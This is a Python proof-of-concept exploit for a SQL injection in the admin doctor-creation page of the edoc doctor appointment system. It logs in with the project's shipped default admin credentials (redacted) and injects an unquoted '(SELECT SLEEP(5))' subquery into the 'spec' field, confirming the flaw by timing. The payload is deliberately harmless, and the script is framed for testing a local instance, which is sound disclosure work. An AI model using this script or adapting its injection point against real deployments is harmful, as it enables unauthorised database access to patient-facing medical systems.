#!/usr/bin/env python3
"""
PoC - edoc-doctor-appointment-system: SQL injection in the admin
doctor-creation handler (admin/add-new.php).

  $_POST['spec'] is concatenated WITHOUT quotes into the numeric `specialties`
  position of the INSERT INTO doctor statement and executed with mysqli::query()
  (line 59/61); a second concatenated INSERT into webuser follows.

Harmless payload only: SLEEP-based timing proof plus the stored return value in
`specialties`. Run it against a LOCAL, ISOLATED instance that you own.

The repository ships default administrator credentials (admin@edoc.com /
<REDACTED>) in SQL_Database_edoc.sql; supply --user/--pass explicitly.

Usage:
    python3 poc-admin-insert-sqli.py http://127.0.0.1:8080
    python3 poc-admin-insert-sqli.py http://127.0.0.1:8080 --user admin@edoc.com --pass <REDACTED>

Expected output on a vulnerable instance:
    baseline : 0.03s
    payload  : ~5.05s
    VULNERABLE
"""

import argparse
import http.cookiejar
import time
import urllib.parse
import urllib.request

ap = argparse.ArgumentParser()
ap.add_argument("base", help="base URL of a local, isolated instance")
ap.add_argument("--user", default="admin@edoc.com", help="admin account (default: shipped seed)")
ap.add_argument("--pass", dest="pwd", default=None, help="admin password (shipped seed value redacted here; see SQL_Database_edoc.sql)")
args = ap.parse_args()
if args.pwd is None:
    raise SystemExit("supply --pass (the shipped seed password; redacted here, see SQL_Database_edoc.sql)")

base = args.base.rstrip("/")

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def post(path, fields):
    data = urllib.parse.urlencode(fields).encode()
    t0 = time.perf_counter()
    opener.open(base + path, data).read()
    return time.perf_counter() - t0


# Admin session (seeded default credentials shipped in SQL_Database_edoc.sql)
post("/login.php", {"useremail": args.user, "userpassword": args.pwd})

stamp = int(time.time())

# Baseline: benign spec=1
t_baseline = post("/admin/add-new.php", {
    "name": "DocBase", "nic": "111", "spec": "1",
    "email": "docbase%d@test.local" % stamp,
    "Tele": "555", "password": "pw1", "cpassword": "pw1",
})

# Payload: spec = (SELECT SLEEP(5)), injected unquoted into values(...)
t_payload = post("/admin/add-new.php", {
    "name": "DocInj", "nic": "222", "spec": "(SELECT SLEEP(5))",
    "email": "docinj%d@test.local" % stamp,
    "Tele": "556", "password": "pw2", "cpassword": "pw2",
})

print("baseline : %.2fs" % t_baseline)
print("payload  : %.2fs" % t_payload)
if t_payload - t_baseline > 4:
    print("VULNERABLE (spec subquery executed; doctor row stores specialties=0, the SLEEP() return value)")
else:
    print("inconclusive (expected ~SLEEP(5) ~ 5s delay)")
